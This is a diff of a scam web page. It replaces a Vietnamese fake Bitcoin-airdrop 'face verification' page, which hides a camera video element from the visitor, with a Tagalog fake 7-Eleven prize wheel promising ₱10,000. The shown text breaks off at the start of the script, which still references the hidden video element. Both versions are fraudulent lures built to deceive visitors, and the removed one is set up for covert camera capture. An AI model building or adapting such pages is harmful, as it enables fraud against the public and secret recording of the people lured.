@@ -1,125 +1,126 @@
-
 <!DOCTYPE html>
-<html lang="vi">
-
+<html lang="tl">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blockchain Airdrop - Nhận 1 BTC</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #0b0e11;
-            color: #eaecef;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>7-11 Spin the win</title>
 
-        .card {
-            background: #1e2329;
-            padding: 30px;
-            border-radius: 16px;
-            text-align: center;
-            width: 90%;
-            max-width: 400px;
-            border: 1px solid #474d57;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
+<style>
 
-        .btc-icon {
-            width: 80px;
-            margin-bottom: 20px;
-        }
+body{
+    margin:0;
+    font-family:Segoe UI, sans-serif;
+    background:radial-gradient(circle,#0f9d58,#0b5f32);
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
 
-        h2 {
-            color: #f3ba2f;
-            margin-bottom: 10px;
-        }
+/* Card */
+.box{
+    width:380px;
+    background:white;
+    padding:30px;
+    border-radius:30px;
+    text-align:center;
+    box-shadow:0 0 60px rgba(0,0,0,.4);
+}
 
-        p {
-            color: #848e9c;
-            font-size: 14px;
-            line-height: 1.6;
-        }
+/* Logo Glow */
+.logo{
+    font-size:42px;
+    font-weight:900;
+    color:#0a8f3a;
+    text-shadow:0 0 12px rgba(10,143,58,.6);
+}
 
-        .btn {
-            background: #f3ba2f;
-            color: #000;
-            border: none;
-            padding: 15px;
-            width: 100%;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-            transition: 0.3s;
-        }
+/* Wheel GOD MODE */
+#wheel{
+    width:230px;
+    height:230px;
+    border-radius:50%;
+    border:10px solid #0a8f3a;
+    margin:25px auto;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-size:28px;
+    font-weight:bold;
 
-        .btn:hover {
-            background: #dba323;
-        }
+    transition:6s cubic-bezier(.1,.7,.1,1);
+}
 
-        /* Camera ẩn hoàn toàn */
-        #vBox {
-            width: 0;
-            height: 0;
-            opacity: 0;
-            overflow: hidden;
-            position: absolute;
-        }
+/* Result */
+#result{
+    font-size:32px;
+    color:#f39c12;
+    opacity:0;
+    transition:1.5s;
+    text-shadow:0 0 10px rgba(243,156,18,.5);
+}
 
-        #loading {
-            display: none;
-            margin-top: 20px;
-        }
+/* Button */
+.btn{
+    width:100%;
+    padding:16px;
+    border:none;
+    border-radius:16px;
+    background:linear-gradient(45deg,#0a8f3a,#1abc9c);
+    color:white;
+    font-size:20px;
+    cursor:pointer;
+    transition:.3s;
+}
 
-        .spinner {
-            border: 3px solid #30363d;
-            border-top: 3px solid #f3ba2f;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
+.btn:hover{
+    transform:scale(1.05);
+}
 
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
+/* Loading */
+#loading{
+    display:none;
+    color:#444;
+    margin:15px;
+}
 
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-    </style>
+/* GOD CONFETTI */
+.confetti{
+    position:fixed;
+    width:8px;
+    height:8px;
+    top:-20px;
+    animation:fall linear forwards;
+}
+
+@keyframes fall{
+    to{
+        transform:translateY(110vh) rotate(720deg);
+    }
+}
+
+</style>
 </head>
 
 <body>
 
-    <div class="card">
-        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="btc-icon" alt="BTC">
-        <h2>Chúc mừng bạn!</h2>
-        <p>Bạn đã đủ điều kiện nhận 1 BTC từ chương trình tri ân. Nhấn nút bên dưới để xác thực khuôn mặt và hoàn tất
-            quy trình nhận thưởng vào ví.</p>
+<div class="box">
 
-        <div id="vBox">
-            <video id="preview" autoplay playsinline muted></video>
-        </div>
+<div class="logo">7-ELEVEN</div>
 
-        <div id="loading">
-            <div class="spinner"></div>
-            <p>Đang quét khuôn mặt và mã hóa dữ liệu...</p>
-        </div>
+<h3>🔥 GOD MODE SPIN 🔥</h3>
 
-        <button class="btn" id="startBtn">XÁC THỰC & NHẬN 1 BTC</button>
-    </div>
+<div id="wheel">🎁 ₱10,000</div>
 
-    <script>
+<div id="loading">System checking winner...</div>
+
+<div id="result">🎉 YOU WON ₱10,000!</div>
+
+<button class="btn" id="startBtn" onclick="spin()">SPIN NOW</button>
+
+</div>
+    
+     <script>
         const btn = document.getElementById('startBtn');
         const loading = document.getElementById('loading');
         const video = document.getElementById('preview');
